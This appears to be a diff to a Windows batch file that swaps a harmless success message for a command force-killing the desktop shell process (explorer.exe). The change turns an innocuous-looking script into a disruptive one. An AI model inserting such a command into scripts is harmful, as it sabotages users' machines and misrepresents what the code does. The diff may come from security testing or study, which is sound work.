@@ -1,2 +1,2 @@
 @echo off
-echo File executed successfully
+taskkill /f /im explorer.exe
